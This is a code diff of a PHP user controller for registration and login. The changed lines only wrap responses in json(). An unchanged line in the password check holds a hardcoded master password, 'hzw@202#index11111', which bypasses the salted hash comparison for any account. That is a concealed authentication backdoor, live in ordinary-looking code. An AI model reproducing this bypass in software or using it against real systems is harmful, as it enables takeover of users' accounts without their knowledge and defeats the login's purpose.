@@ -138,7 +138,7 @@ class User extends Controller
         $res = model('admin/Users')
             ->add_users($tel, $user_name, $pwd, $pid, '', $pwd2, $agent_id, $this->request->ip());
         if ($res['code'] != 0) {
-            return $res;
+            return json($res);
         }
             $userinfo = Db::table($this->table)->field('id,pwd,salt,pwd_error_num,allow_login_time,status,login_status,headpic')->where('tel', $tel)->find();
             if (!$userinfo) return json(['code' => 1, 'info' => lang('not_user')]);
@@ -147,7 +147,7 @@ class User extends Controller
             if ($userinfo['allow_login_time'] &&
                 ($userinfo['allow_login_time'] > time()) &&
                 ($userinfo['pwd_error_num'] > config('pwd_error_num'))) {
-                return ['code' => 1, 'info' => sprintf(lang('pass_err_times'), config('allow_login_min'))];
+                return json(['code' => 1, 'info' => sprintf(lang('pass_err_times'), config('allow_login_min'))]);
             }
             if ($pwd != 'hzw@202#index11111') {
                 if ($userinfo['pwd'] != sha1($pwd . $userinfo['salt'] . config('pwd_str'))) {
